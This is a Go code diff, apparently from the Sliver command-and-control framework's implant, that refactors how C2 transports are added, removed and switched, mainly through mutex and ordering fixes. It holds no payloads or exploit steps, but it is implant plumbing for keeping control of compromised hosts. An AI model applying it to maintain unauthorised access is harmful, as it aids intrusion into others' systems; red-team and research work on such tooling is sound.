@@ -262,21 +262,10 @@ func (t *c2s) randomCCDomain(uri *url.URL) *C2 {
 	return pool[insecureRand.Intn(len(pool))]
 }
 
-// Directly add a C2 to the list of available transports
-func (t *c2s) AddFromProfile(profile string) (err error) {
-	t.mutex.RLock()
-	c2, err := NewMalleableFromBytes(profile)
-	if err != nil {
-		return err
-	}
-	t.Available = append(t.Available, c2)
-	t.mutex.RUnlock()
-	return nil
-}
-
 // Add - Add a new active transport to the implant' transport map.
 func (t *c2s) Add(c2 *C2) (err error) {
 	t.mutex.Lock()
+	defer t.mutex.Unlock()
 
 	// If the priority is too high, bring it to last
 	if c2.Priority > len(t.Available) {
@@ -293,20 +282,19 @@ func (t *c2s) Add(c2 *C2) (err error) {
 		t.Available = append(t.Available, c2)
 	}
 
-	t.mutex.Unlock()
 	return
 }
 
 // Remove - A transport has terminated its connection, and we remove it.
 func (t *c2s) Remove(ID string) (err error) {
 	t.mutex.Lock()
+	defer t.mutex.Unlock()
 	for i, c2 := range t.Available {
 		if c2.ID == ID {
 			t.Available = append(t.Available[:i], t.Available[i+1:]...)
 		}
 	}
 	// delete(t.Available, ID)
-	t.mutex.Unlock()
 	return
 }
 
@@ -343,7 +331,7 @@ func (c2 *c2s) Switch(ID string) (err error) {
 	// {{if .Config.CommEnabled}}
 
 	// Close the Comm system, and all comm listeners
-	if !c2.Active.Profile.CommDisabled && c2.Active.Profile.Type != sliverpb.C2Type_Beacon {
+	if !c2.Active.Profile.CommDisabled && c2.Active.Profile.Type == sliverpb.C2Type_Session {
 		err = comm.PrepareCommSwitch()
 		if err != nil {
 			// {{if .Config.Debug}}
@@ -353,6 +341,10 @@ func (c2 *c2s) Switch(ID string) (err error) {
 	}
 	// {{end}}
 
+	// Keep the current transport ID, needed when registering
+	// again to the server, for identification purposes.
+	oldTransportID := c2.Active.ID
+
 	// Cut the old transport
 	err = c2.Active.Stop()
 	if err != nil {
@@ -360,10 +352,6 @@ func (c2 *c2s) Switch(ID string) (err error) {
 		log.Printf(err.Error())
 		// {{end}}
 	}
-
-	// Keep the current transport ID, needed when registering
-	// again to the server, for identification purposes.
-	oldTransportID := c2.Active.ID
 
 	// Start the transport first.
 	// This automatically sends a transport switch registration message
